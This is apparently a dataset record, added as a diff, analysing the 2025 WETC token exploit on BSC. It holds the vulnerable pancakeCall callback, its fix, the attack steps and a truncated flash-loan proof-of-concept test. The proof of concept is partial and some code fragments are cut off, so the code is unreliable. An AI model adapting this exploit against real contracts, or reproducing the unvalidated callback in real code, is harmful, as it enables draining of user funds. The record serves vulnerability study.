@@ -1,0 +1,36 @@
+{
+ "id": "2025__2025-07-25_WETC_Token_PancakeSwapCallback",
+ "source_file": "2025/2025-07-25_WETC_Token_PancakeSwapCallback.md",
+ "title": "WETC Token — PancakeSwap Callback Manipulation Analysis",
+ "date": "2025-07-25",
+ "protocol": "WETC Token",
+ "chain": "BSC",
+ "loss_raw": "~101,000 USD",
+ "loss_usd": null,
+ "root_cause": "PancakeSwap swap callback allows mass token transfer without caller validation",
+ "attack_tx": "0x2b6b411a",
+ "vulnerable_contract": "0xaf68efb3c1e81aad5cdb3d4962c8815fb754c688",
+ "classes": [
+  "business-logic",
+  "unprotected-callback"
+ ],
+ "code_before": [
+  "❌ Vulnerable logic: no msg.sender validation in pancakeCall callback\ncontract WETCToken {\n    function pancakeCall(\n        address sender,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external {\n        //",
+  "❌ No validation that msg.sender is the actual PancakePair\n        // Anyone can call this function directly or trigger it via another path\n        uint256 amt0 = abi.decode(data, (uint256));\n        IERC20(BUSD).transfer(msg.sender, amt0); // Transfers to arbitrary recipient\n    }\n\n    // Or: internal asset movement logic exists inside the swap callback\n}\n\n//",
+  "// File: WETC_decompiled.sol\ncontract WETC {\n    function swap(uint256 a, uint256 b, address c, bytes calldata d) external {  // ❌ Vulnerability\n        // TODO: decompiled logic not yet implemented\n    }"
+ ],
+ "code_after": [
+  "✅ Fix: validate msg.sender and pair\nfunction pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n    require(msg.sender == address(CAKE_LP), \"Caller is not PancakePair\");\n    require(sender == address(this), \"Sender is not this contract\");\n    ...\n}"
+ ],
+ "steps": [
+  "1 ▶ ERC1967Proxy.flashLoan(WBNB, 49.15 WBNB)",
+  "2 ▶ CAKE_LP.swap(amt0_WETC, 1_BUSD, attacker, payload)",
+  "3 ▶ pancakeCall callback executes",
+  "4 ▶ WETC → WBNB swap (PancakeRouter)",
+  "5 ▶ ERC1967Proxy: flash loan repaid + ~101,000 USD WBNB profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─1─▶ ERC1967Proxy.flashLoan(WBNB, 49.15 WBNB)\n  │         [onMoolahFlashLoan callback]\n  │\n  ├─2─▶ CAKE_LP.swap(amt0_WETC, 1_BUSD, attacker, payload)\n  │         └─ swap call triggers pancakeCall\n  │\n  ├─3─▶ pancakeCall callback executes\n  │         └─ Commands encoded in payload move large amount of WETC internally\n  │         └─ 74,963,130,190,599,057,252,979,324 WETC transferred\n  │\n  ├─4─▶ WETC → WBNB swap (PancakeRouter)\n  │         └─ Mass WETC converted to WBNB\n  │\n  └─5─▶ ERC1967Proxy: flash loan repaid + ~101,000 USD WBNB profit",
+  "contract WETC is BaseTestWithBalanceLog {\n    uint256 blocknumToForkFrom = 54333337;\n    uint256 borrowAmount = 1000000000000000000000000;\n\n    function testExploit() public balanceLog {\n        // Pre-approve WBNB\n        WBNB.approve(address(ercproxy), type(uint256).max);\n\n        // Borrow WBNB via ERC1967Proxy flash loan\n        ercproxy.flashLoan(address(WBNB), flashAmount, \"0x00\");\n    }\n\n    function onMoolahFlashLoan(uint256 assets, bytes memory data) public {\n        // Approve flash loan repayment\n        WBNB.approve(address(ercproxy), flashAmount);\n\n        // Trigger pancakeCall via PancakePair swap\n        // Encode mass WETC movement command in payload\n        uint256 amt0 = 74963130190599057252979324; // Mass WETC\n        Cake_LP.swap(amt0, 1, address(this),\n            hex"
+ ]
+}
